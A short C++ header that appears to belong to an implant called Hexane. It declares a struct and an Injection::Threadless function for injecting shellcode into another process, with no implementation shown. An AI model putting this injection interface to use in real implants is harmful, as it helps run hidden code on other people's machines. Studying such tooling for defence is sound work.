#ifndef HEXANE_IMPLANT_INJECT_HPP
#define HEXANE_IMPLANT_INJECT_HPP
#include <core/corelib.hpp>

typedef struct _threadless {
    A_BUFFER Parent;
    A_BUFFER Module;
    A_BUFFER Export;
    A_BUFFER Loader;
    A_BUFFER Opcode;
} THREADLESS, *PTHREADLESS;

namespace Injection {
    FUNCTION VOID Threadless(THREADLESS Threadless, LPVOID shellcode, SIZE_T cbShellcode, SIZE_T ccbShellcode);
}
#endif //HEXANE_IMPLANT_INJECT_HPP
